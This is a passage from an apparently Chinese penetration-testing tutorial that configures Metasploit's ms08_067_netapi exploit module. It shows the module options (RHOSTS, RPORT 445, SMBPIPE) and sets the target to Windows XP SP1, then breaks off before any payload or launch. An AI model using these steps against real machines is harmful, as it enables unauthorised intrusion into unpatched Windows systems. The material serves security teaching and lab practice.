查看ms08\_067\_netapi模块的配置选项，在输出的结果中显示了Module options（模块选项）和Exploit target（可利用目标）两部分内容。具体如下：

  

msf5 exploit(ms08\_067\_netapi) > show options

Module options (exploit/windows/smb/ms08\_067\_netapi):

Name     Current Setting   Required    Description

\-----    ---------------  ---------   -------------

RHOSTS 192.168.1.104  yes       The target address range or CIDR identifier

RPORT    445            yes       The SMB service port (TCP)

SMBPIPE  BROWSER       yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

Id  Name

\--  ---------------------------

0   Automatic Targeting

  

从以上显示的信息中可以看到，在Exploit target部分包括Id（目标编号）和Name（目标名称）两列信息。此时，还没有设置目标类型，所以默认选择的目标编号为0，为自动探测目标。

2）本例中的目标系统类型为[Windows](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127496&idx=3&sn=21acddfe6a98fe94ae346db72555e138&chksm=bc859a278bf21331d775fdb2224b50832a618a13d3a8fa76c41786186e846f5126daf96682bc&scene=21#wechat_redirect) XP SP1，所以选择编号为2的目标类型。设置目标类型的语法如下：

  

set target \[目标编号\]

  

本例中将执行的命令如下：

  

msf5 exploit(ms08\_067\_netapi) > set target 2

target => 2

  

通过show options命令查看设置的目标类型。显示结果如下：

  

msf5 exploit(ms08\_067\_netapi) > show options
